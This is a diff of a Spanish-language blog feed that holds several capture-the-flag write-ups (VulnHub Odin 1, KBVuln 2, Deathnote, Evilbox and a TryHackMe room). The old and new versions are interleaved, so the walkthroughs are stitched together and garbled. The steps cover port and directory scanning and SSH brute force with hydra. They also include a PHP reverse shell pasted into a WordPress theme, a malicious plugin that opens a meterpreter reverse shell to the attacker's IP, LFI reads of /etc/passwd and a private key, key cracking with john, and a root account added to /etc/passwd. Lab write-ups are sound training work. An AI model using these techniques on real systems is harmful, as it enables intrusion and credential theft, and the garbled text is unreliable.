+<p>Guardar el contenido en un archivo del equipo atacante</p>
 
-![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/odin1/17.png){: .align-center}
+<p><img src="http://localhost:4000/assets/images/thm/basicpentesting/10.png" alt="image-center" class="align-center" /></p>
 
-Encontrará una contraseña para el usuario admin
+<p>Convertirlo a hash con la herramienta <code class="language-plaintext highlighter-rouge">ssh2john.py</code> y guardarlo en otro archivo nuevo</p>
 
-![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/odin1/18.png){: .align-center}
-![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/odin1/19.png){: .align-center}
+<p><img src="http://localhost:4000/assets/images/thm/basicpentesting/11.png" alt="image-center" class="align-center" /></p>
 
-Entrar al panel de control de wordpress con el usuario admin y la contraseña que ha mostrado wpscan
+<p>Crackear la contraseña con <code class="language-plaintext highlighter-rouge">john</code>, servirán tanto rockyou como dark0de</p>
 
-![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/odin1/20.png){: .align-center}
+<p><img src="http://localhost:4000/assets/images/thm/basicpentesting/12.png" alt="image-center" class="align-center" /></p>
 
-Dará acceso al panel de control de la web
+<p>Entrar por ssh usando la clave privada e introduciendo la contraseña crackeada</p>
 
-![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/odin1/20.png){: .align-center}
+<p><img src="http://localhost:4000/assets/images/thm/basicpentesting/13.png" alt="image-center" class="align-center" /></p>
 
-Ir al editor de temas y probar si puede modificarse el tema del error 404
-Copiar el contenido de `/usr/share/webshells/php/php-reverse-shell.php`
+<p>Ir al directorio personal de Kay y leer el archivo <code class="language-plaintext highlighter-rouge">pass.bak</code></p>
 
-![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/odin1/21.png){: .align-center}
+<p><img src="http://localhost:4000/assets/images/thm/basicpentesting/14.png" alt="image-center" class="align-center" /></p>]]></content><author><name>TheZombrex</name></author><category term="tryhackme" /><category term="tryhackme" /><category term="writeup" /><summary type="html"><![CDATA[[Academy][TryHackMe] Writeup de Basic Pentesting.]]></summary></entry><entry><title type="html">Deathnote</title><link href="http://localhost:4000/vulnhub/deathnote/" rel="alternate" type="text/html" title="Deathnote" /><published>2022-08-01T00:00:00+02:00</published><updated>2022-08-01T00:00:00+02:00</updated><id>http://localhost:4000/vulnhub/deathnote</id><content type="html" xml:base="http://localhost:4000/vulnhub/deathnote/"><![CDATA[<p><a href="https://www.vulnhub.com/entry/deathnote-1,739/">https://www.vulnhub.com/entry/deathnote-1,739/</a></p>
 
-![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/odin1/22.png){: .align-center}
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">sudo </span>nmap <span class="nt">-vvv</span> <span class="nt">-sS</span> <span class="nt">-sV</span> <span class="nt">-O</span> 192.168.1.0/24
+</code></pre></div></div>
 
-Pegarlo en el tema del error 404
+<p><img src="http://localhost:4000/assets/images/vulnhub/deathnote/1.png" alt="image-center" class="align-center" /></p>
 
-![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/odin1/23.png){: .align-center}
+<p>Saldrá una IP con los puertos 80 y 22 abiertos</p>
 
-Ver la IP del equipo atacante
+<p><img src="http://localhost:4000/assets/images/vulnhub/deathnote/2.png" alt="image-center" class="align-center" /></p>
 
-ifconfig
+<p>Al intentar entrar a la web saldrá un mensaje que dice Please wait y se redireccionará a una web de wordpress.</p>
 
-![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/odin1/24.png){: .align-center}
+<p><img src="http://localhost:4000/assets/images/vulnhub/deathnote/3.png" alt="image-center" class="align-center" /></p>
 
-Cambiar el puerto y la ip en el script
+<p>Realizar un escaneo de todos los directorios del sitio con gobuster</p>
 
-![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/odin1/25.png){: .align-center}
+<p><img src="http://localhost:4000/assets/images/vulnhub/deathnote/4.png" alt="image-center" class="align-center" /></p>
 
-Y aplicar los cambios
+<p>Ir a <code class="language-plaintext highlighter-rouge">/robots.txt</code></p>
 
-![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/odin1/26.png){: .align-center}
+<p><img src="http://localhost:4000/assets/images/vulnhub/deathnote/5.png" alt="image-center" class="align-center" />
+<img src="http://localhost:4000/assets/images/vulnhub/deathnote/6.png" alt="image-center" class="align-center" /></p>
 
-Poner el equipo con el puerto de escucha
+<p>Ir a <code class="language-plaintext highlighter-rouge">/important.jpg</code></p>
 
-![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/odin1/27.png){: .align-center}
+<p><img src="http://localhost:4000/assets/images/vulnhub/deathnote/7.png" alt="image-center" class="align-center" /></p>
 
-Entrar a una direccion inválida en la web de wordpress
+<p>Dirá que la imagen no se puede cargar por contener errores así que procedemos a descargar ese archivo a nuestro equipo usando <code class="language-plaintext highlighter-rouge">wget</code></p>
 
-![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/odin1/28.png){: .align-center}
+<p><img src="http://localhost:4000/assets/images/vulnhub/deathnote/8.png" alt="image-center" class="align-center" /></p>
 
-Abrirá una shell inversa
+<p>Comprobar que el archivo es realmente una imagen en jpg</p>
 
-![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/odin1/29.png){: .align-center}
+<p><img src="http://localhost:4000/assets/images/vulnhub/deathnote/9.png" alt="image-center" class="align-center" /></p>
 
-Ir al home de los usuarios y mostrar contenido, no mostrará nada relevante
+<p>Dirá que realmente es un documento de texto al que se le ha cambiado el nombre para hacer parecer que es una imagen.</p>
 
-Ir a /var/www/html/ y mostrar contenido
+<p>Leer el archivo <code class="language-plaintext highlighter-rouge">important.jpg</code>, no es necesario cambiar su extensión para que cat lo reconozca.</p>
 
-![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/odin1/30.png){: .align-center}
+<p><img src="http://localhost:4000/assets/images/vulnhub/deathnote/10.png" alt="image-center" class="align-center" /></p>
 
-Leer el contenido de `wp-config.php`
+<p>Dirá que miremos en <code class="language-plaintext highlighter-rouge">/user.txt</code>, tambien que la contraseña puede estar en el lugar de la pista</p>
 
-![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/odin1/31.png){: .align-center}
+<p>Entrar a la web y darle click al Hint</p>
 
-Mostrará una contraseña cifrada para el usuario root
+<p><img src="http://localhost:4000/assets/images/vulnhub/deathnote/11.png" alt="image-center" class="align-center" /></p>
 
-![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/odin1/32.png){: .align-center}
+<p>Dirá que busquemos un archivo llamado <code class="language-plaintext highlighter-rouge">notes.txt</code> en el servidor o leamos el comentario de L</p>
 
-Copiar la contraseña cifrada y guardarla en un archivo del equipo atacante
+<p><img src="http://localhost:4000/assets/images/vulnhub/deathnote/12.png" alt="image-center" class="align-center" /></p>
 
-![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/odin1/33.png){: .align-center}
+<p>Mirar el comentario de L</p>
 
-Usar `john` para descifrar la contraseña del usuario root
+<p><img src="http://localhost:4000/assets/images/vulnhub/deathnote/13.png" alt="image-center" class="align-center" /></p>
 
-![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/odin1/34.png){: .align-center}
+<p>Probar a acceder desde el login con el usuario Kira y la contraseña iamjustic3</p>
 
-Mostrará una contraseña para el usuario root
+<p><img src="http://localhost:4000/assets/images/vulnhub/deathnote/14.png" alt="image-center" class="align-center" /></p>
 
-![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/odin1/35.png){: .align-center}
+<p>Dará acceso al panel de administrador de Wordpress</p>
 
-Cambiar de usuario a root
+<p><img src="http://localhost:4000/assets/images/vulnhub/deathnote/15.png" alt="image-center" class="align-center" /></p>
 
-![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/odin1/36.png){: .align-center}
+<p>Probar a entrar al editor de temas para modificar el de 404, mostrará que no es posible</p>
 
-Ir al directorio de root
+<p><img src="http://localhost:4000/assets/images/vulnhub/deathnote/16.png" alt="image-center" class="align-center" /></p>
 
-![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/odin1/37.png){: .align-center}
+<p>Utilizar <code class="language-plaintext highlighter-rouge">malicious-wordpress-plugin</code> para crear un plugin que abrirá un shell inverso</p>
 
-Leer el contenido de `bjorn`
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>python wordpwn.py 192.168.122.5 4444 Y
+</code></pre></div></div>
 
-![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/odin1/38.png){: .align-center}
+<p><img src="http://localhost:4000/assets/images/vulnhub/deathnote/17.png" alt="image-center" class="align-center" /></p>
 
-Al desencriptar el mensaje llevará a un vídeo de youtube
+<p>Quedará en el puerto de escucha y se generará un archivo zip que será el plugin</p>
 
-![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/odin1/39.png){: .align-center}
+<p>Subir el plugin al sitio de wordpress</p>
 
-![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/odin1/40.png){: .align-center}]]></content><author><name>TheZombrex</name></author><category term="vulnhub" /><category term="vulnhub" /><category term="easy" /><category term="writeup" /><category term="video" /><summary type="html"><![CDATA[[Easy][Vulnhub] Writeup de Odin 1.]]></summary></entry><entry><title type="html">KBVuln 2</title><link href="http://localhost:4000/vulnhub/kbvuln2/" rel="alternate" type="text/html" title="KBVuln 2" /><published>2022-08-01T00:00:00+02:00</published><updated>2022-08-01T00:00:00+02:00</updated><id>http://localhost:4000/vulnhub/kbvuln2</id><content type="html" xml:base="http://localhost:4000/vulnhub/kbvuln2/"><![CDATA[[https://www.vulnhub.com/entry/kb-vuln-2,562/](https://www.vulnhub.com/entry/kb-vuln-2,562/)
+<p><img src="http://localhost:4000/assets/images/vulnhub/deathnote/18.png" alt="image-center" class="align-center" />
+<img src="http://localhost:4000/assets/images/vulnhub/deathnote/19.png" alt="image-center" class="align-center" /></p>
 
-[https://github.com/wetw0rk/malicious-wordpress-plugin](https://github.com/wetw0rk/malicious-wordpress-plugin)
+<p>Activar el plugin</p>
 
-```bash
-sudo nmap -vvv -sS -sV -O 192.168.122.0/24
-```
+<p><img src="http://localhost:4000/assets/images/vulnhub/deathnote/20.png" alt="image-center" class="align-center" /></p>
 
-![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/kbvuln2/1.png){: .align-center}
+<p>Ir al editor de plugins y seleccionar GotEm</p>
 
-Saldrá una máquina con varios puertos abiertos
+<p><img src="http://localhost:4000/assets/images/vulnhub/deathnote/21.png" alt="image-center" class="align-center" /></p>
 
-![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/kbvuln2/2.png){: .align-center}
+<p>Ir a la ruta del plugin</p>
 
-Entrar al servidor web con la dirección 192.168.122.6, saldrá la web por defecto de Apache
+<p>http://192.168.122.7/wordpress/wp-content/plugins/malicious/wetw0rk_maybe.php</p>
 
-![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/kbvuln2/3.png){: .align-center}
+<p>Se abrirá un shell inverso con meterpreter</p>
 
-Usar gobuster para ver directorios ocultos, mostrará como resultado varios directorios, entre ellos uno llamado wordpress
-```bash
-sudo gobuster dir -u 192.168.122.6 -w /usr/share/dirb/wordlists/common.txt
-```
+<p><img src="http://localhost:4000/assets/images/vulnhub/deathnote/22.png" alt="image-center" class="align-center" /></p>
 
-![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/kbvuln2/4.png){: .align-center}
+<p>Entrar en modo shell con el comando <code class="language-plaintext highlighter-rouge">shell</code></p>
 
-Enumerar los usuarios de la web de wordpress, solo encontrará el usuario admin
-```bash
-sudo wpscan --url 192.168.122.6/wordpress -e u
-```
+<p><img src="http://localhost:4000/assets/images/vulnhub/deathnote/21.png" alt="image-center" class="align-center" /></p>
 
-Usuario: Anonymous
-Contraseña: Vacía
+<p>Comprobar que el usuario es <code class="language-plaintext highlighter-rouge">www-data</code></p>
 
-![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/kbvuln2/5.png){: .align-center}
-![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/kbvuln2/6.png){: .align-center}
+<p><img src="http://localhost:4000/assets/images/vulnhub/deathnote/22.png" alt="image-center" class="align-center" /></p>
 
-Lanzar un ataque de fuerza bruta para encontrar la contraseña del usuario admin, no dará resultado
+<p>Ir al directorio home y mostrar contenido para ver los usuarios, se mostraran el usuario kira y el usuario l</p>
 
-![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/kbvuln2/7.png){: .align-center}
+<p><img src="http://localhost:4000/assets/images/vulnhub/deathnote/23.png" alt="image-center" class="align-center" /></p>
 
-Buscar usuarios en el sistema, solo encontrará kbadmin
+<p>Entrar en el directorio de kira, mostrar el contenido e intentar leer el archivo <code class="language-plaintext highlighter-rouge">kira.txt</code></p>
 
-![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/kbvuln2/8.png){: .align-center}
+<p><img src="http://localhost:4000/assets/images/vulnhub/deathnote/24.png" alt="image-center" class="align-center" /></p>
 
-![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/kbvuln2/9.png){: .align-center}
+<p>Volver atrás e intentar lo mismo en el directorio de <code class="language-plaintext highlighter-rouge">l</code>, mostrar el contenido de <code class="language-plaintext highlighter-rouge">user.txt</code>, mostrará un texto cifrado en Brainfuck</p>
 
-Intentar un ataque de fuerza bruta para conseguir la contraseña, no dará resultado
+<p><img src="http://localhost:4000/assets/images/vulnhub/deathnote/25.png" alt="image-center" class="align-center" /></p>
 
-```bash
-sudo hydra -l kbadmin -P /usr/share/wordlists/rockyou.txt 192.168.122.6 ssh
-```
+<p>Descifrar el mensaje usando la web de dcode.fr, mostrará el mensaje “i think u got the shell, but you wont be able to kill me -kira”</p>
 
-![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/kbvuln2/10.png){: .align-center}
+<p><img src="http://localhost:4000/assets/images/vulnhub/deathnote/26.png" alt="image-center" class="align-center" /></p>
 
-Ver directorios compartidos por smb
+<p>Volver al panel de wordpress e investigar más, en la sección de media se encontrará el archivo <code class="language-plaintext highlighter-rouge">notes.txt</code></p>
 
-```bash
-smbmap -H  192.168.122.6
-```
+<p><img src="http://localhost:4000/assets/images/vulnhub/deathnote/27.png" alt="image-center" class="align-center" /></p>
 
-![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/kbvuln2/11.png){: .align-center}
+<p>Parece ser un diccionario de posibles claves, descargarlo</p>
 
-Entrar al directorio de Anonymous y mostrar el contenido
+<p><img src="http://localhost:4000/assets/images/vulnhub/deathnote/28.png" alt="image-center" class="align-center" /></p>
 
-```bash
-smbclient -N //192.168.122.6/Anonymous
-```
+<p>Usar <code class="language-plaintext highlighter-rouge">hydra</code> para encontrar cuál de las contraseñas es del usuario L en <code class="language-plaintext highlighter-rouge">ssh</code></p>
 
-![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/kbvuln2/12.png){: .align-center}
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">sudo </span>hydra <span class="nt">-t</span> 4 <span class="nt">-l</span> l <span class="nt">-P</span> Downloads/notes.txt 192.168.122.7 ssh
+</code></pre></div></div>
 
-Descargar el archivo backup.zip
+<p><img src="http://localhost:4000/assets/images/vulnhub/deathnote/29.png" alt="image-center" class="align-center" /></p>
 
-```bash
-get backup.zip
-```
+<p>Usuario: l
+Contraseña: death4me</p>
 
-![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/kbvuln2/13.png){: .align-center}
+<p>Entrar por <code class="language-plaintext highlighter-rouge">ssh</code> con el usuario l y la contraseña death4me</p>
 
-Moverlo a un nuevo directorio y descomprimirlo
+<p>Ir al directorio <code class="language-plaintext highlighter-rouge">/opt</code> y mostrar el contenido</p>
 
-```bash
-mkdir kbvuln2
-mv backup.zip kbvuln2/
-ls
-unzip backup.zip
-```
+<p><img src="http://localhost:4000/assets/images/vulnhub/deathnote/30.png" alt="image-center" class="align-center" /></p>
 
-![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/kbvuln2/14.png){: .align-center}
+<p>Ir al directorio y mostrar el contenido</p>
 
-![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/kbvuln2/15.png){: .align-center}
+<p><img src="http://localhost:4000/assets/images/vulnhub/deathnote/31.png" alt="image-center" class="align-center" /></p>
 
-Creará un directorio llamado wordpress y un archivo llamado `remember_me.txt`
+<p>Ir al directorio <code class="language-plaintext highlighter-rouge">fake-notebook-rule/</code> y mostrar el contenido, el archivo <code class="language-plaintext highlighter-rouge">hint</code> dirá que se use cyberchef aunque no es necesario</p>
 
-![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/kbvuln2/16.png){: .align-center}
+<p><img src="http://localhost:4000/assets/images/vulnhub/deathnote/32.png" alt="image-center" class="align-center" /></p>
 
-Leer el archivo remember_me.txt, mostrará un usuario y contraseña
+<p>Comprobar el tipo de archivo de <code class="language-plaintext highlighter-rouge">case.wav</code></p>
 
-![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/kbvuln2/17.png){: .align-center}
+<p><img src="http://localhost:4000/assets/images/vulnhub/deathnote/33.png" alt="image-center" class="align-center" /></p>
 
-Ir al login de la web de wordpress
+<p>Leer el archivo <code class="language-plaintext highlighter-rouge">case.wav</code></p>
 
-![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/kbvuln2/18.png){: .align-center}
+<p><img src="http://localhost:4000/assets/images/vulnhub/deathnote/34.png" alt="image-center" class="align-center" /></p>
 
-Copiar la direccion DNS del action del formulario.
+<p>Usar dcode.fr para descifrar el contenido</p>
 
-![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/kbvuln2/19.png){: .align-center}
+<p><img src="http://localhost:4000/assets/images/vulnhub/deathnote/35.png" alt="image-center" class="align-center" /></p>
 
-Añadir el dominio dns al archivo `/etc/hosts`
+<p><img src="http://localhost:4000/assets/images/vulnhub/deathnote/36.png" alt="image-center" class="align-center" /></p>
 
-![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/kbvuln2/20.png){: .align-center}
+<p><img src="http://localhost:4000/assets/images/vulnhub/deathnote/37.png" alt="image-center" class="align-center" /></p>
 
-Recargar el sitio, ahora se verá correctamente
+<p><img src="http://localhost:4000/assets/images/vulnhub/deathnote/38.png" alt="image-center" class="align-center" /></p>
 
-![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/kbvuln2/21.png){: .align-center}
+<p>Ir al directorio <code class="language-plaintext highlighter-rouge">kira-case/</code>, el archivo case-file.txt no mostrará nada relevante</p>
 
-Colocar el usuario y contraseña y dar en Log In
+<p><img src="http://localhost:4000/assets/images/vulnhub/deathnote/39.png" alt="image-center" class="align-center" /></p>
 
-![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/kbvuln2/22.png){: .align-center}
+<p>Cambiar al usuario kira con la contraseña del mensaje cifrado anterior</p>
 
-Ir al editor de temas de wordpress
+<p><img src="http://localhost:4000/assets/images/vulnhub/deathnote/40.png" alt="image-center" class="align-center" /></p>
 
-![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/kbvuln2/23.png){: .align-center}
+<p>Mostrar que permisos tiene el usuario con el comando</p>
 
-Editar el archivo 404 con un script de reverse_php
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">sudo</span> <span class="nt">-l</span>
+</code></pre></div></div>
 
-Preparar un plugin que hará un shell inverso
+<p>Mostrará que puede ejecutar todo, esto significa que puede cambiar a usuario root sin necesidad de introducir contraseña</p>
 
-```bash
-cd ~/Downloads/repos
+<p><img src="http://localhost:4000/assets/images/vulnhub/deathnote/41.png" alt="image-center" class="align-center" /></p>
+
+<p>Cambiar al usuario root</p>
+
+<p><img src="http://localhost:4000/assets/images/vulnhub/deathnote/42.png" alt="image-center" class="align-center" /></p>
+
+<p>Ir al directorio de root y mostrar el contenido</p>
+
+<p><img src="http://localhost:4000/assets/images/vulnhub/deathnote/43.png" alt="image-center" class="align-center" /></p>
+
+<p>Leer el contenido de <code class="language-plaintext highlighter-rouge">root.txt</code></p>
+
+<p><img src="http://localhost:4000/assets/images/vulnhub/deathnote/44.png" alt="image-center" class="align-center" /></p>]]></content><author><name>TheZombrex</name></author><category term="vulnhub" /><category term="vulnhub" /><category term="easy" /><category term="writeup" /><summary type="html"><![CDATA[[Easy][Vulnhub] Writeup de Deathnote.]]></summary></entry><entry><title type="html">Evilbox</title><link href="http://localhost:4000/vulnhub/evilbox/" rel="alternate" type="text/html" title="Evilbox" /><published>2022-08-01T00:00:00+02:00</published><updated>2022-08-01T00:00:00+02:00</updated><id>http://localhost:4000/vulnhub/evilbox</id><content type="html" xml:base="http://localhost:4000/vulnhub/evilbox/"><![CDATA[<p><a href="https://www.vulnhub.com/entry/evilbox-one,736/">https://www.vulnhub.com/entry/evilbox-one,736/</a></p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">sudo </span>nmap <span class="nt">-vvv</span> <span class="nt">-sS</span> <span class="nt">-sV</span> <span class="nt">-O</span> <span class="nt">-Pn</span> 192.168.122.0/24
+</code></pre></div></div>
+
+<p><img src="http://localhost:4000/assets/images/vulnhub/evilbox/1.png" alt="image-center" class="align-center" /></p>
+
+<p>Saldrá una IP con los puertos 80 y 22 abiertos</p>
+
+<p><img src="http://localhost:4000/assets/images/vulnhub/evilbox/2.png" alt="image-center" class="align-center" /></p>
+
+<p>Al entrar en la web aparecerá la página por defecto de Apache y no se mostrará nada en el código fuente</p>
+
+<p><img src="http://localhost:4000/assets/images/vulnhub/evilbox/3.png" alt="image-center" class="align-center" /></p>
+
+<p>Escanear todos los directorios ocultos</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">sudo </span>gobuster <span class="nb">dir</span> –u 192.168.122.14 <span class="nt">-w</span> /usr/share/wordlists/dirb/big.txt
+</code></pre></div></div>
+
+<p><img src="http://localhost:4000/assets/images/vulnhub/evilbox/4.png" alt="image-center" class="align-center" /></p>
+
+<p>Mostrará el archivo <code class="language-plaintext highlighter-rouge">robots.txt</code> y un directorio llamado <code class="language-plaintext highlighter-rouge">secret</code></p>
+
+<p><img src="http://localhost:4000/assets/images/vulnhub/evilbox/5.png" alt="image-center" class="align-center" /></p>
+
+<p>Ir a robots.txt, no mostrará nada relevante
+<code class="language-plaintext highlighter-rouge">192.168.122.14/robots.txt</code></p>
+
+<p><img src="http://localhost:4000/assets/images/vulnhub/evilbox/6.png" alt="image-center" class="align-center" /></p>
+
+<p>Ir a secret, no mostrará contenido, sin embargo tampoco mostrará mensaje de error
+<code class="language-plaintext highlighter-rouge">192.168.122.14/secret</code></p>
+
+<p><img src="http://localhost:4000/assets/images/vulnhub/evilbox/7.png" alt="image-center" class="align-center" /></p>
+
+<p>Realizar escaneo de directorios bajo el directorio secret y listando todo lo que termine en html, php o txt</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">sudo </span>gobuster <span class="nb">dir</span> –u 192.168.122.14/secret  <span class="nt">-w</span> /usr/share/wordlists/dirb/big.txt <span class="nt">-x</span> html,php,txt
+</code></pre></div></div>
+
+<p><img src="http://localhost:4000/assets/images/vulnhub/evilbox/8.png" alt="image-center" class="align-center" /></p>
+
+<p>Aparecerá un nuevo archivo llamado <code class="language-plaintext highlighter-rouge">evil.php</code></p>
+
+<p><img src="http://localhost:4000/assets/images/vulnhub/evilbox/9.png" alt="image-center" class="align-center" /></p>
+
+<p>Al ir de nuevo no mostrará nada, ni si quiera mensaje de error</p>
+
+<p><code class="language-plaintext highlighter-rouge">192.168.122.14/secret/evil.php</code></p>
+
+<p><img src="http://localhost:4000/assets/images/vulnhub/evilbox/10.png" alt="image-center" class="align-center" /></p>
+
+<p>Tratar de fuzzear para intentar ejecutar comandos y de este modo leer el contenido de <code class="language-plaintext highlighter-rouge">/etc/passwd</code></p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>wfuzz <span class="nt">-u</span> <span class="s2">"http://192.168.122.14/secret/evil.php?FUZZ=../../../../../../etc/passwd"</span>  <span class="nt">-w</span> /usr/share/wordlists/fuzz-lfi-params-list.txt <span class="nt">-hw</span> 0
+</code></pre></div></div>
+
+<p><img src="http://localhost:4000/assets/images/vulnhub/evilbox/11.png" alt="image-center" class="align-center" /></p>
+
+<p>Aparecerá como resultado que puede usarse command</p>
+
+<p><img src="http://localhost:4000/assets/images/vulnhub/evilbox/12.png" alt="image-center" class="align-center" /></p>
+
+<p>Ir a la url añadiendo <code class="language-plaintext highlighter-rouge">?command=../../../../../../etc/passwd</code></p>
+
+<p><code class="language-plaintext highlighter-rouge">192.168.122.14/secret/evil.php?command=../../../../../../etc/passwd</code></p>
+
+<p><img src="http://localhost:4000/assets/images/vulnhub/evilbox/13.png" alt="image-center" class="align-center" /></p>
+
+<p>Inspeccionar el código fuente para que se muestre de forma ordenada</p>
+
+<p><img src="http://localhost:4000/assets/images/vulnhub/evilbox/14.png" alt="image-center" class="align-center" /></p>
+
+<p>Al observar el archivo <code class="language-plaintext highlighter-rouge">/etc/passwd</code> podrá verse un usuario llamado mowree</p>
+
+<p><img src="http://localhost:4000/assets/images/vulnhub/evilbox/15.png" alt="image-center" class="align-center" /></p>
+
+<p>Ir a <code class="language-plaintext highlighter-rouge">/home/mowree/.ssh/id_rsa</code> para buscar la clave privada del usuario</p>
+
+<p>http://192.168.122.14/secret/evil.php?FUZZ=/home/mowree/.ssh/id_rsa</p>
+
+<p><img src="http://localhost:4000/assets/images/vulnhub/evilbox/16.png" alt="image-center" class="align-center" /></p>
+
+<p>Copiar la clave privada y guardarla en el equipo atacante</p>
+
+<p><img src="http://localhost:4000/assets/images/vulnhub/evilbox/17.png" alt="image-center" class="align-center" /></p>
+
+<p><img src="http://localhost:4000/assets/images/vulnhub/evilbox/18.png" alt="image-center" class="align-center" /></p>
+
+<p>Convertirlo a hash con la herramienta ssh2john.py y guardarlo en otro archivo nuevo</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>/usr/share/john/ssh2john.py id_rsa <span class="o">&gt;</span> id_rsa_hash.txt
+</code></pre></div></div>
+
+<p><img src="http://localhost:4000/assets/images/vulnhub/evilbox/19.png" alt="image-center" class="align-center" /></p>
+
+<p>Crackear la contraseña con john</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>john id_rsa_hash.txt
+</code></pre></div></div>
+
+<p><img src="http://localhost:4000/assets/images/vulnhub/evilbox/20.png" alt="image-center" class="align-center" /></p>
+
+<p>Mostrará la contraseña como resultado</p>
+
+<p><img src="http://localhost:4000/assets/images/vulnhub/evilbox/21.png" alt="image-center" class="align-center" /></p>
+
+<p>Entrar por ssh con el usuario mowree y la contraseña encontrada</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ssh mowree@192.168.122.14 <span class="nt">-i</span> id_rsa
+</code></pre></div></div>
+
+<p><img src="http://localhost:4000/assets/images/vulnhub/evilbox/22.png" alt="image-center" class="align-center" /></p>
+
+<p>Mostrar el contenido del directorio home del usuario mowree y leer el archivo <code class="language-plaintext highlighter-rouge">user.txt</code></p>
+
+<p><img src="http://localhost:4000/assets/images/vulnhub/evilbox/23.png" alt="image-center" class="align-center" /></p>
+
+<p>Al mostrar los permisos de <code class="language-plaintext highlighter-rouge">/etc/passwd</code> podrá verse que tiene permiso de escritura para todos los usuarios</p>
+
+<p><img src="http://localhost:4000/assets/images/vulnhub/evilbox/24.png" alt="image-center" class="align-center" /></p>
+
+<p>Crear una nuevo usuario con una clave creada en  formato sha-512 desde la maquina atacante</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>mkpasswd <span class="nt">-m</span> sha-512
+</code></pre></div></div>
+
+<p><img src="http://localhost:4000/assets/images/vulnhub/evilbox/25.png" alt="image-center" class="align-center" /></p>
+
+<p>Guardarla en un archivo y crear una linea como si de un usuario se tratase, dando permisos de root</p>
+
+<p><img src="http://localhost:4000/assets/images/vulnhub/evilbox/26.png" alt="image-center" class="align-center" /></p>
+
+<p>Copiar este nuevo usuario y ponerlo en el <code class="language-plaintext highlighter-rouge">/etc/passwd</code> de la máquina victima</p>
+
+<p><img src="http://localhost:4000/assets/images/vulnhub/evilbox/27.png" alt="image-center" class="align-center" /></p>
+
+<p>Cambiar al usuario nuevo</p>
+
+<p><img src="http://localhost:4000/assets/images/vulnhub/evilbox/28.png" alt="image-center" class="align-center" /></p>
+
+<p>Ir a <code class="language-plaintext highlighter-rouge">/root</code> y mostrar el contenido de root.txt</p>
+
+<p><img src="http://localhost:4000/assets/images/vulnhub/evilbox/29.png" alt="image-center" class="align-center" /></p>
+
+<h2 id="flags">Flags</h2>
+
+<p>User: 56Rbp0soobpzWSVzKh9YOvzGLgtPZQ</p>
+
